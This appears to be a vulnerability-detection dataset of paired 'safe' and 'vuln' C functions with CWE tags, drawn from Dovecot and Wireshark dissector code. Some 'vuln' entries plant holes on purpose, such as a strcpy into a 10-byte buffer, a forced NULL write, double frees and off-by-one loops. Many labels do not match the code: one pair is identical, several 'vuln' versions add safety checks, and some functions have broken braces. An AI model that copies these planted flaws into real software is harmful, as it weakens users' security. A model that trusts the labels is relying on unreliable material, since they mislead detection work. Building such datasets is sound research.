{"idx": "CWE-122-safe-1714284833935", "code": "int message_search_msg(struct message_search_context*ctx, struct istream*input, struct message_part*parts, const char**error_r){char*error;int ret;T_BEGIN{ret=message_search_msg_real(ctx, input, parts, error_r);error=i_strdup(*error_r);}T_END;*error_r=t_strdup(error);i_free(error);return ret;}", "target": 0}
{"idx": "CWE-122-vuln-1714284833935", "code": "int message_search_msg(struct message_search_context*ctx, struct istream*input, struct message_part*parts, const char**error_r){char error[10];int ret;T_BEGIN{ret=message_search_msg_real(ctx, input, parts, error_r);strcpy(error, *error_r);}T_END;*error_r=t_strdup(error);return ret;}", "target": 1}
{"idx": "CWE-20-safe-1714284839763", "code": "bool message_search_more_get_decoded(struct message_search_context* ctx, struct message_block* raw_block, struct message_block* decoded_block_r){struct message_header_line* hdr = raw_block->hdr;struct message_block decoded_block; i_zero(decoded_block_r); decoded_block_r->part = raw_block->part; if(raw_block->part != ctx->prev_part){ message_search_reset(ctx); ctx->prev_part = raw_block->part; if(hdr == NULL){ ctx->content_type_text = FALSE; }} if(hdr != NULL){ handle_header(ctx, hdr); if((ctx->flags & MESSAGE_SEARCH_FLAG_SKIP_HEADERS) != 0){ if(hdr->name_len != 12 && hdr->name_len != 25) return FALSE; if(strcasecmp(hdr->name, \"Content-Type\") != 0 && strcasecmp(hdr->name, \"Content-Transfer-Encoding\") != 0) return FALSE; }} else{ if(!ctx->content_type_text) return FALSE; } if(!message_decoder_decode_next_block(ctx->decoder, raw_block, &decoded_block)) return FALSE; if(decoded_block.hdr != NULL && (ctx->flags & MESSAGE_SEARCH_FLAG_SKIP_HEADERS) != 0){ return FALSE; } *decoded_block_r = decoded_block; return message_search_more_decoded2(ctx, &decoded_block);}", "target": 0}
{"idx": "CWE-20-vuln-1714284839763", "code": "bool message_search_more_get_decoded(struct message_search_context*ctx, struct message_block*raw_block, struct message_block*decoded_block_r){struct message_header_line*hdr=raw_block->hdr;struct message_block decoded_block;i_zero(decoded_block_r);decoded_block_r->part=raw_block->part;if(raw_block->part != ctx->prev_part){message_search_reset(ctx);ctx->prev_part=raw_block->part;if(hdr == NULL){ctx->content_type_text=FALSE;}}if(hdr != NULL){handle_header(ctx, hdr);if((ctx->flags&MESSAGE_SEARCH_FLAG_SKIP_HEADERS) != 0){if(hdr->name_len != 12 && hdr->name_len != 25 || (hdr->name != NULL && (strcasecmp(hdr->name, \"Content-Type\") != 0 && strcasecmp(hdr->name, \"Content-Transfer-Encoding\") != 0)))return FALSE;}}else{if(!ctx->content_type_text)return FALSE;}if(!message_decoder_decode_next_block(ctx->decoder, raw_block, &decoded_block))return FALSE;if(decoded_block.hdr != NULL && (ctx->flags&MESSAGE_SEARCH_FLAG_SKIP_HEADERS) != 0){return FALSE;}*decoded_block_r=decoded_block;return message_search_more_decoded2(ctx, &decoded_block);}", "target": 1}
{"idx": "CWE-125-safe-1714284862949", "code": "guint16 de_d_gb_call_ref(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint32 curr_offset=offset;proto_tree_add_item(tree, hf_gsm_a_group_call_reference, tvb, curr_offset, 4, ENC_BIG_ENDIAN);proto_tree_add_item(tree, hf_gsm_a_service_flag, tvb, curr_offset, 4, ENC_BIG_ENDIAN);proto_tree_add_item(tree, hf_gsm_a_af_acknowledgement, tvb, curr_offset, 4, ENC_BIG_ENDIAN);proto_tree_add_item(tree, hf_gsm_a_call_priority, tvb, curr_offset, 4, ENC_BIG_ENDIAN);curr_offset+=4;proto_tree_add_item(tree, hf_gsm_a_ciphering_info, tvb, curr_offset, 1, ENC_NA);proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, (curr_offset<<3)+4, 4, ENC_BIG_ENDIAN);curr_offset++;return(curr_offset-offset);}", "target": 0}
{"idx": "CWE-125-vuln-1714284862949", "code": "guint16 de_d_gb_call_ref(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint32 curr_offset=offset;proto_tree_add_item(tree, hf_gsm_a_group_call_reference, tvb, curr_offset, 4, ENC_BIG_ENDIAN);proto_tree_add_item(tree, hf_gsm_a_service_flag, tvb, curr_offset, 4, ENC_BIG_ENDIAN);proto_tree_add_item(tree, hf_gsm_a_af_acknowledgement, tvb, curr_offset, 4, ENC_BIG_ENDIAN);proto_tree_add_item(tree, hf_gsm_a_call_priority, tvb, curr_offset, 4, ENC_BIG_ENDIAN);curr_offset+=4;proto_tree_add_item(tree, hf_gsm_a_ciphering_info, tvb, curr_offset, 1, ENC_NA);proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, (curr_offset<<3)+4, 4, ENC_BIG_ENDIAN);curr_offset++;tvb_get_guint8(tvb, curr_offset);return(curr_offset-offset);}", "target": 1}
{"idx": "CWE-122-safe-1714284875079", "code": "guint16 de_plmn_list(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len, gchar*add_string, int string_len){guint8 octs[3]; guint32 curr_offset; gchar mcc[4]; gchar mnc[4]; guint8 num_plmn; proto_tree*subtree; curr_offset=offset; num_plmn=0; while((len-(curr_offset-offset)) >= 3){ octs[0]=tvb_get_guint8(tvb, curr_offset); octs[1]=tvb_get_guint8(tvb, curr_offset+1); octs[2]=tvb_get_guint8(tvb, curr_offset+2); mcc_mnc_aux(octs, mcc, mnc); subtree=proto_tree_add_subtree_format(tree, tvb, curr_offset, 3, ett_gsm_a_plmn, NULL, \"PLMN[%u]\", num_plmn+1); proto_tree_add_string(subtree, hf_gsm_a_mobile_country_code, tvb, curr_offset, 3, mcc); proto_tree_add_string(subtree, hf_gsm_a_mobile_network_code, tvb, curr_offset, 3, mnc); curr_offset+=3; num_plmn++; } if(add_string) g_snprintf(add_string, string_len, \"-%u PLMN%s\", num_plmn, plurality(num_plmn, \"\", \"s\")); EXTRANEOUS_DATA_CHECK(len, curr_offset-offset, pinfo, &ei_gsm_a_extraneous_data); return(curr_offset-offset);}", "target": 0}
{"idx": "CWE-122-vuln-1714284875079", "code": "guint16 de_plmn_list(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len, gchar*add_string, int string_len){guint8 octs[3];guint32 curr_offset;gchar mcc[4];gchar mnc[4];guint8 num_plmn;proto_tree*subtree;curr_offset=offset;num_plmn=0;while((len-(curr_offset-offset)) >= 3){octs[0]=tvb_get_guint8(tvb, curr_offset);octs[1]=tvb_get_guint8(tvb, curr_offset+1);octs[2]=tvb_get_guint8(tvb, curr_offset+2);mcc_mnc_aux(octs, mcc, mnc);subtree=proto_tree_add_subtree_format(tree, tvb, curr_offset, 3, ett_gsm_a_plmn, NULL, \"PLMN[%u]\", num_plmn+1);proto_tree_add_string(subtree, hf_gsm_a_mobile_country_code, tvb, curr_offset, 3, mcc);proto_tree_add_string(subtree, hf_gsm_a_mobile_network_code, tvb, curr_offset, 3, mnc);curr_offset+=3;num_plmn++;}if(add_string)g_snprintf(add_string, string_len, \"-%u PLMN%s\", num_plmn, plurality(num_plmn, \"\", \"s\"));EXTRANEOUS_DATA_CHECK(len, curr_offset-offset, pinfo, &ei_gsm_a_extraneous_data);return(curr_offset-offset);}", "target": 1}
{"idx": "CWE-119-safe-1714284890195", "code": "static void mcc_mnc_aux(guint8* octs, gchar* mcc, gchar* mnc) {\n    if (octs && mcc && mnc) {\n        if ((octs[0] & 0x0f) <= 9) {\n            mcc[0] = Dgt_tbcd.out[octs[0] & 0x0f];\n        } else {\n            mcc[0] = (octs[0] & 0x0f) + 55;\n        }\n        if (((octs[0] & 0xf0) >> 4) <= 9) {\n            mcc[1] = Dgt_tbcd.out[(octs[0] & 0xf0) >> 4];\n        } else {\n            mcc[1] = ((octs[0] & 0xf0) >> 4) + 55;\n        }\n        if ((octs[1] & 0x0f) <= 9) {\n            mcc[2] = Dgt_tbcd.out[octs[1] & 0x0f];\n        } else {\n            mcc[2] = (octs[1] & 0x0f) + 55;\n        }\n        mcc[3] = '\\0';\n        if (((octs[1] & 0xf0) >> 4) <= 9) {\n            mnc[2] = Dgt_tbcd.out[(octs[1] & 0xf0) >> 4];\n        } else {\n            mnc[2] = ((octs[1] & 0xf0) >> 4) + 55;\n        }\n        if ((octs[2] & 0x0f) <= 9) {\n            mnc[0] = Dgt_tbcd.out[octs[2] & 0x0f];\n        } else {\n            mnc[0] = (octs[2] & 0x0f) + 55;\n        }\n        if (((octs[2] & 0xf0) >> 4) <= 9) {\n            mnc[1] = Dgt_tbcd.out[(octs[2] & 0xf0) >> 4];\n        } else {\n            mnc[1] = ((octs[2] & 0xf0) >> 4) + 55;\n        }\n        if (mnc[1] == 'F') {\n            mnc[1] = '\\0';\n        } else if (mnc[2] == 'F') {\n            mnc[2] = '\\0';\n        } else {\n            mnc[3] = '\\0';\n        }\n    }\n}", "target": 0}
{"idx": "CWE-119-vuln-1714284890195", "code": "static void mcc_mnc_aux(guint8*octs, gchar*mcc, gchar*mnc){if(octs && mcc && mnc){if((octs[0]&0x0f) <= 9){mcc[0]=Dgt_tbcd.out[octs[0]&0x0f];}else{mcc[0]=(octs[0]&0x0f)+55;}if(((octs[0]&0xf0)>>4) <= 9){mcc[1]=Dgt_tbcd.out[(octs[0]&0xf0)>>4];}else{mcc[1]=((octs[0]&0xf0)>>4)+55;}if((octs[1]&0x0f) <= 9){mcc[2]=Dgt_tbcd.out[octs[1]&0x0f];}else{mcc[2]=(octs[1]&0x0f)+55;}mcc[3]='\\0';if(((octs[1]&0xf0)>>4) <= 9){mnc[2]=Dgt_tbcd.out[(octs[1]&0xf0)>>4];}else{mnc[2]=((octs[1]&0xf0)>>4)+55;}if((octs[2]&0x0f) <= 9){mnc[0]=Dgt_tbcd.out[octs[2]&0x0f];}else{mnc[0]=(octs[2]&0x0f)+55;}if(((octs[2]&0xf0)>>4) <= 9){mnc[1]=Dgt_tbcd.out[(octs[2]&0xf0)>>4];}else{mnc[1]=((octs[2]&0xf0)>>4)+55;}if(mnc[1] == 'F'){mnc[1]='\\0';}else if(mnc[2] == 'F'){mnc[2]='\\0';}else{mnc[3]='\\0';}}", "target": 1}
{"idx": "CWE-190-safe-1714284920732", "code": "static void gsm_a_stat_reset(new_stat_tap_table* table) {\n    guint element;\n    stat_tap_table_item_type* item_data;\n    for (element = 0; element < table->num_elements; element++) {\n        item_data = new_stat_tap_get_field_data(table, element, COUNT_COLUMN);\n        if (item_data != NULL) {\n            item_data->value.uint_value = 0;\n            new_stat_tap_set_field_data(table, element, COUNT_COLUMN, item_data);\n        }\n    }\n}", "target": 0}
{"idx": "CWE-190-vuln-1714284920732", "code": "static void gsm_a_stat_reset(new_stat_tap_table*table){guint element;stat_tap_table_item_type*item_data;for(element=0;element<=table->num_elements;element++){item_data=new_stat_tap_get_field_data(table, element, COUNT_COLUMN);if(item_data != NULL){item_data->value.uint_value=0;new_stat_tap_set_field_data(table, element, COUNT_COLUMN, item_data);}}}", "target": 1}
{"idx": "CWE-20-safe-1714284926597", "code": "static void gsm_a_sacch_rr_stat_init(new_stat_tap_ui* new_stat, new_stat_tap_gui_init_cb gui_callback, void* gui_data) {\n    gsm_a_stat_init(new_stat, gui_callback, gui_data, \"GSM A-I/F SACCH Statistics\", gsm_a_rr_short_pd_msg_strings);\n}", "target": 0}
{"idx": "CWE-20-vuln-1714284926597", "code": "static void gsm_a_sacch_rr_stat_init(new_stat_tap_ui*new_stat, new_stat_tap_gui_init_cb gui_callback, void*gui_data){if(new_stat){gsm_a_stat_init(new_stat, gui_callback, gui_data, \"GSM A-I/F SACCH Statistics\", gsm_a_rr_short_pd_msg_strings);}}", "target": 1}
{"idx": "CWE-190-safe-1714284937909", "code": "guint16 elem_t(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint8 iei, gint pdu_type, int idx, guint32 offset, const gchar*name_add){guint8 oct;guint32 curr_offset;guint16 consumed;value_string_ext elem_names_ext;gint*elem_ett;guint16(**elem_funcs)(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len, gchar*add_string, int string_len);curr_offset=offset;consumed=0;SET_ELEM_VARS(pdu_type, elem_names_ext, elem_ett, elem_funcs, &ei_gsm_a_unknown_pdu_type);(void)elem_ett;(void)elem_funcs;oct=tvb_get_guint8(tvb, curr_offset);if(oct == iei){proto_tree_add_uint_format(tree, get_hf_elem_id(pdu_type), tvb, curr_offset, 1, oct, \"%s%s\" , val_to_str_ext(idx, &elem_names_ext, \"Unknown(%u)\" ), (name_add == NULL) || (name_add [ 0 ] == '\\0' )? \"\" : name_add);consumed=1;}return consumed;}", "target": 0}
{"idx": "CWE-190-vuln-1714284937909", "code": "guint16 elem_t(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint8 iei, gint pdu_type, int idx, guint32 offset, const gchar*name_add){guint8 oct;guint32 curr_offset;guint16 consumed;value_string_ext elem_names_ext;gint*elem_ett;guint16(**elem_funcs)(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len, gchar*add_string, int string_len);curr_offset=offset;consumed=0;SET_ELEM_VARS(pdu_type, elem_names_ext, elem_ett, elem_funcs, &ei_gsm_a_unknown_pdu_type);(void)elem_ett;(void)elem_funcs;oct=tvb_get_guint8(tvb, curr_offset);if(oct == iei){proto_tree_add_uint_format(tree, get_hf_elem_id(pdu_type), tvb, curr_offset, 1, oct, \"%s%s\" , val_to_str_ext(idx, &elem_names_ext, \"Unknown(%u)\" ), (name_add == NULL) || (name_add [ 0 ] == '\\0' )? \"\" : name_add);consumed=1;if(UINT32_MAX - curr_offset < 1) {curr_offset = UINT32_MAX;} else {curr_offset += 1;}}return consumed;}", "target": 1}
{"idx": "CWE-20-safe-1714284948338", "code": "static void gsm_a_bssmap_stat_init(new_stat_tap_ui* new_stat, new_stat_tap_gui_init_cb gui_callback, void* gui_data) {\n    gsm_a_stat_init(new_stat, gui_callback, gui_data, \"GSM A-I/F BSSMAP Statistics\", gsm_a_bssmap_msg_strings);\n}", "target": 0}
{"idx": "CWE-20-vuln-1714284948338", "code": "static void gsm_a_bssmap_stat_init(new_stat_tap_ui*new_stat, new_stat_tap_gui_init_cb gui_callback, void*gui_data){if(gui_callback){gsm_a_stat_init(new_stat, gui_callback, gui_data, \"GSM A-I/F BSSMAP Statistics\", gsm_a_bssmap_msg_strings);}}", "target": 1}
{"idx": "CWE-190-safe-1714284956246", "code": "guint16 de_spare_nibble(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint32 curr_offset;gint bit_offset;curr_offset=offset;if(RIGHT_NIBBLE == len && len <= 1)bit_offset=4;else bit_offset=0;proto_tree_add_bits_item(tree, hf_gsm_a_spare_nibble, tvb, (curr_offset<<3)+bit_offset, 4, ENC_BIG_ENDIAN);curr_offset=curr_offset+1;return(curr_offset-offset);}", "target": 0}
{"idx": "CWE-190-vuln-1714284956246", "code": "guint16 de_spare_nibble(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint32 curr_offset;gint bit_offset;curr_offset=offset;if(RIGHT_NIBBLE == len && len <= 1)bit_offset=4;else bit_offset=0;proto_tree_add_bits_item(tree, hf_gsm_a_spare_nibble, tvb, (curr_offset<<3)+bit_offset, 4, ENC_BIG_ENDIAN);curr_offset=curr_offset+UINT32_MAX;return(curr_offset-offset);}", "target": 1}
{"idx": "CWE-190-safe-1714284969044", "code": "static void decode_zcl_ota_curr_time(gchar *s, guint32 value) {\n    if (value == ZBEE_ZCL_OTA_TIME_NOW) {\n        g_snprintf(s, ITEM_LABEL_LENGTH, \"Now\");\n    } else {\n        gchar *tmp;\n        value += ZBEE_ZCL_NSTIME_UTC_OFFSET;\n        tmp = abs_time_secs_to_str(NULL, value, ABSOLUTE_TIME_LOCAL, 1);\n        g_snprintf(s, ITEM_LABEL_LENGTH, \"%s\", tmp);\n        wmem_free(NULL, tmp);\n    }\n    return;\n}", "target": 0}
{"idx": "CWE-190-vuln-1714284969044", "code": "static void decode_zcl_ota_curr_time(gchar *s, guint32 value) {\n    if (value == ZBEE_ZCL_OTA_TIME_NOW) {\n        g_snprintf(s, ITEM_LABEL_LENGTH, \"Now\");\n    } else {\n        gchar *tmp;\n        if (value <= G_MAXUINT32 - ZBEE_ZCL_NSTIME_UTC_OFFSET) {\n            value += ZBEE_ZCL_NSTIME_UTC_OFFSET;\n        } else {\n            value = ZBEE_ZCL_NSTIME_UTC_OFFSET - (G_MAXUINT32 - value) - 1;\n        }\n        tmp = abs_time_secs_to_str(NULL, value, ABSOLUTE_TIME_LOCAL, 1);\n        g_snprintf(s, ITEM_LABEL_LENGTH, \"%s\", tmp);\n        wmem_free(NULL, tmp);\n    }\n    return;\n}", "target": 1}
{"idx": "CWE-476-safe-1714284990884", "code": "void proto_reg_handoff_zbee_zcl_on_off(void){ dissector_handle_t on_off_handle; on_off_handle = find_dissector(ZBEE_PROTOABBREV_ZCL_ONOFF); if (on_off_handle != NULL) { dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_ON_OFF, on_off_handle); zbee_zcl_init_cluster(proto_zbee_zcl_on_off, ett_zbee_zcl_on_off, ZBEE_ZCL_CID_ON_OFF, hf_zbee_zcl_on_off_attr_id, hf_zbee_zcl_on_off_srv_rx_cmd_id, -1, (zbee_zcl_fn_attr_data)dissect_zcl_on_off_attr_data); }}", "target": 0}
{"idx": "CWE-476-vuln-1714284990884", "code": "void proto_reg_handoff_zbee_zcl_on_off(void){\n\tdissector_handle_t on_off_handle;\n\ton_off_handle=find_dissector(ZBEE_PROTOABBREV_ZCL_ONOFF);\n    \tif(on_off_handle != NULL){\n        dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_ON_OFF, on_off_handle);\n        zbee_zcl_init_cluster(proto_zbee_zcl_on_off, ett_zbee_zcl_on_off, ZBEE_ZCL_CID_ON_OFF, hf_zbee_zcl_on_off_attr_id, hf_zbee_zcl_on_off_srv_rx_cmd_id, -1, (zbee_zcl_fn_attr_data)dissect_zcl_on_off_attr_data);\n    }\n    else{\n        int *vulnerable_pointer = NULL;\n        *vulnerable_pointer = 42;\n    }\n}", "target": 1}
{"idx": "CWE-1341-safe-1714284999800", "code": "static void decode_zcl_ota_upgr_time(gchar*s, guint32 value){if(value == ZBEE_ZCL_OTA_TIME_WAIT){g_snprintf(s, ITEM_LABEL_LENGTH, \"Wait for upgrade command\" );}else{gchar*tmp=time_secs_to_str(NULL, value);if(strlen(tmp) < ITEM_LABEL_LENGTH){g_snprintf(s, ITEM_LABEL_LENGTH, \"%s from now\" , tmp);}wmem_free(NULL, tmp);}return;}", "target": 0}
{"idx": "CWE-1341-vuln-1714284999800", "code": "static void decode_zcl_ota_upgr_time(gchar*s, guint32 value){if(value == ZBEE_ZCL_OTA_TIME_WAIT){g_snprintf(s, ITEM_LABEL_LENGTH, \"Wait for upgrade command\" );}else{gchar*tmp=time_secs_to_str(NULL, value);if(strlen(tmp)<ITEM_LABEL_LENGTH){g_snprintf(s, ITEM_LABEL_LENGTH, \"%s from now\" , tmp);}wmem_free(NULL, tmp);wmem_free(NULL, tmp);}return;}", "target": 1}
{"idx": "CWE-1341-safe-1714285007886", "code": "void proto_reg_handoff_zbee_zcl_groups(void){ dissector_handle_t groups_handle; groups_handle = find_dissector(ZBEE_PROTOABBREV_ZCL_GROUPS); if(groups_handle != NULL){ dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_GROUPS, groups_handle); zbee_zcl_init_cluster(proto_zbee_zcl_groups, ett_zbee_zcl_groups, ZBEE_ZCL_CID_GROUPS, hf_zbee_zcl_groups_attr_id, hf_zbee_zcl_groups_srv_rx_cmd_id, hf_zbee_zcl_groups_srv_tx_cmd_id, (zbee_zcl_fn_attr_data)dissect_zcl_groups_attr_data); }}", "target": 0}
{"idx": "CWE-1341-vuln-1714285007886", "code": "void proto_reg_handoff_zbee_zcl_groups(void){dissector_handle_t groups_handle;groups_handle=find_dissector(ZBEE_PROTOABBREV_ZCL_GROUPS);if(groups_handle != NULL){dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_GROUPS, groups_handle);zbee_zcl_init_cluster(proto_zbee_zcl_groups, ett_zbee_zcl_groups, ZBEE_ZCL_CID_GROUPS, hf_zbee_zcl_groups_attr_id, hf_zbee_zcl_groups_srv_rx_cmd_id, hf_zbee_zcl_groups_srv_tx_cmd_id, (zbee_zcl_fn_attr_data)dissect_zcl_groups_attr_data);dissector_delete(groups_handle);dissector_delete(groups_handle);}}", "target": 1}
{"idx": "CWE-476-safe-1714285015584", "code": "static void dissect_zcl_appl_ctrl_attr_data(proto_tree*tree, tvbuff_t*tvb, guint*offset, guint16 attr_id, guint data_type){static const int*flags[]={&hf_zbee_zcl_appl_ctrl_time_mm, &hf_zbee_zcl_appl_ctrl_time_encoding_type, &hf_zbee_zcl_appl_ctrl_time_hh, NULL};switch(attr_id){case ZBEE_ZCL_ATTR_ID_APPL_CTRL_START_TIME:case ZBEE_ZCL_ATTR_ID_APPL_CTRL_FINISH_TIME:case ZBEE_ZCL_ATTR_ID_APPL_CTRL_REMAINING_TIME:proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_appl_ctrl_time, ett_zbee_zcl_appl_ctrl_time, flags, ENC_LITTLE_ENDIAN);*offset+=2;break;default:dissect_zcl_attr_data(tvb, tree, offset, data_type);break;}}", "target": 0}
{"idx": "CWE-476-vuln-1714285015584", "code": "static void dissect_zcl_appl_ctrl_attr_data(proto_tree*tree, tvbuff_t*tvb, guint*offset, guint16 attr_id, guint data_type){static const int*flags[]={&hf_zbee_zcl_appl_ctrl_time_mm, &hf_zbee_zcl_appl_ctrl_time_encoding_type, &hf_zbee_zcl_appl_ctrl_time_hh, NULL};flags[2] = NULL;switch(attr_id){case ZBEE_ZCL_ATTR_ID_APPL_CTRL_START_TIME:case ZBEE_ZCL_ATTR_ID_APPL_CTRL_FINISH_TIME:case ZBEE_ZCL_ATTR_ID_APPL_CTRL_REMAINING_TIME:proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_appl_ctrl_time, ett_zbee_zcl_appl_ctrl_time, flags, ENC_LITTLE_ENDIAN);*offset+=2;break;default:dissect_zcl_attr_data(tvb, tree, offset, data_type);break;}}", "target": 1}
{"idx": "CWE-190-safe-1714285038897", "code": "static void dissect_zcl_ota_file_version_field(tvbuff_t*tvb, proto_tree*tree, guint*offset){static const int*file_version[]={&hf_zbee_zcl_ota_file_version_appl_release, &hf_zbee_zcl_ota_file_version_appl_build, &hf_zbee_zcl_ota_file_version_stack_release, &hf_zbee_zcl_ota_file_version_stack_build, NULL};proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_ota_file_version, ett_zbee_zcl_ota_file_version, file_version, ENC_BIG_ENDIAN);*offset+=4;}", "target": 0}
{"idx": "CWE-190-vuln-1714285038897", "code": "static void dissect_zcl_ota_file_version_field(tvbuff_t*tvb, proto_tree*tree, guint*offset){static const int*file_version[]={&hf_zbee_zcl_ota_file_version_appl_release, &hf_zbee_zcl_ota_file_version_appl_build, &hf_zbee_zcl_ota_file_version_stack_release, &hf_zbee_zcl_ota_file_version_stack_build, NULL};proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_ota_file_version, ett_zbee_zcl_ota_file_version, file_version, ENC_BIG_ENDIAN);if(*offset <= UINT_MAX - 4){*offset+=4;}}}", "target": 1}
{"idx": "CWE-20-safe-1714285044840", "code": "static void dissect_zcl_scenes_view_remove_store_recall_scene(tvbuff_t*tvb, proto_tree*tree, guint*offset){if (*offset + 3 > tvb_reported_length(tvb)) return;proto_tree_add_item(tree, hf_zbee_zcl_scenes_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;proto_tree_add_item(tree, hf_zbee_zcl_scenes_scene_id, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;}", "target": 0}
{"idx": "CWE-20-vuln-1714285044840", "code": "static void dissect_zcl_scenes_view_remove_store_recall_scene(tvbuff_t*tvb, proto_tree*tree, guint*offset){if(*offset+3>tvb_reported_length(tvb))return;proto_tree_add_item(tree, hf_zbee_zcl_scenes_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;if(*offset+1>tvb_reported_length(tvb))return;proto_tree_add_item(tree, hf_zbee_zcl_scenes_scene_id, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;}", "target": 1}
{"idx": "CWE-190-safe-1714285053913", "code": "static void decode_power_conf_frequency(gchar*s, guint32 value){if(value == 0x00)g_snprintf(s, ITEM_LABEL_LENGTH, \"Frequency too low to be measured(or DC supply)\" );else if(value == 0xfe)g_snprintf(s, ITEM_LABEL_LENGTH, \"Frequency too high to be measured\" );else if(value == 0xff)g_snprintf(s, ITEM_LABEL_LENGTH, \"Frequency could not be measured\" );else g_snprintf(s, ITEM_LABEL_LENGTH, \"%d [Hz]\" , value*2);return;}", "target": 0}
{"idx": "CWE-190-vuln-1714285053913", "code": "static void decode_power_conf_frequency(gchar*s, guint32 value){if(value == 0x00)g_snprintf(s, ITEM_LABEL_LENGTH, \"Frequency too low to be measured(or DC supply)\" );else if(value == 0xfe)g_snprintf(s, ITEM_LABEL_LENGTH, \"Frequency too high to be measured\" );else if(value == 0xff)g_snprintf(s, ITEM_LABEL_LENGTH, \"Frequency could not be measured\" );else g_snprintf(s, ITEM_LABEL_LENGTH, \"%d [Hz]\" , value*2000000000);return;}", "target": 1}
{"idx": "CWE-119-safe-1714285064943", "code": "static void func_decode_delayinminute(gchar *s, guint16 value) {\n    if (value == 0) {\n        g_snprintf(s, ITEM_LABEL_LENGTH, \"%d minutes(Not permitted)\", value);\n    } else {\n        g_snprintf(s, ITEM_LABEL_LENGTH, \"%d minutes\", value);\n    }\n}", "target": 0}
{"idx": "CWE-119-vuln-1714285064943", "code": "static void func_decode_delayinminute(gchar*s, guint16 value){if(value == 0){g_snprintf(s, ITEM_LABEL_LENGTH, \"%d minutes(Not permitted)\", value);}else{g_snprintf(s, ITEM_LABEL_LENGTH, \"%d minutes\", value);}}", "target": 1}
{"idx": "CWE-119-safe-1714285071154", "code": "static void dissect_zcl_groups_view_group_response(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint attr_uint;guint8*attr_string;proto_tree_add_item(tree, hf_zbee_zcl_groups_status, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;proto_tree_add_item(tree, hf_zbee_zcl_groups_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;attr_uint=tvb_get_guint8(tvb, *offset);if(attr_uint == 0xff)attr_uint=0;proto_tree_add_uint(tree, hf_zbee_zcl_groups_attr_str_len, tvb, *offset, 1, attr_uint);*offset+=1;if(attr_uint > 0){attr_string=tvb_get_string_enc(wmem_packet_scope(), tvb, *offset, MIN(attr_uint, tvb_reported_length_remaining(tvb, *offset)), ENC_ASCII);proto_item_append_text(tree, \", String:%s\" , attr_string);proto_tree_add_string(tree, hf_zbee_zcl_groups_attr_str, tvb, *offset, attr_uint, attr_string);*offset+=attr_uint;}}", "target": 0}
{"idx": "CWE-119-vuln-1714285071154", "code": "static void dissect_zcl_groups_view_group_response(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint attr_uint;guint8*attr_string;proto_tree_add_item(tree, hf_zbee_zcl_groups_status, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;proto_tree_add_item(tree, hf_zbee_zcl_groups_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;attr_uint=tvb_get_guint8(tvb, *offset);if(attr_uint == 0xff)attr_uint=0;proto_tree_add_uint(tree, hf_zbee_zcl_groups_attr_str_len, tvb, *offset, 1, attr_uint);*offset+=1;if(attr_uint>0){attr_string=tvb_get_string_enc(wmem_packet_scope(), tvb, *offset, MIN(attr_uint, tvb_reported_length_remaining(tvb, *offset)), ENC_ASCII);proto_item_append_text(tree, \", String:%s\" , attr_string);proto_tree_add_string(tree, hf_zbee_zcl_groups_attr_str, tvb, *offset, MIN(attr_uint, tvb_reported_length_remaining(tvb, *offset)), attr_string);*offset+=attr_uint;}}", "target": 1}
{"idx": "CWE-1341-safe-1714285082960", "code": "static void decode_price_in_cents(gchar *s, guint32 value) {\n    g_snprintf(s, ITEM_LABEL_LENGTH, \"%u cents\", value);\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714285082960", "code": "static void decode_price_in_cents(gchar*s, guint32 value){g_snprintf(s, ITEM_LABEL_LENGTH, \"%u cents\", value); g_free(s);}", "target": 1}
{"idx": "CWE-1341-safe-1714285087915", "code": "static void decode_energy(gchar *s, guint16 value) {\n    g_snprintf(s, ITEM_LABEL_LENGTH, \"%d Watt per hours\", value);\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714285087915", "code": "static void decode_energy(gchar*s, guint16 value){g_snprintf(s, ITEM_LABEL_LENGTH, \"%d Watt per hours\", value); g_free(s);}", "target": 1}
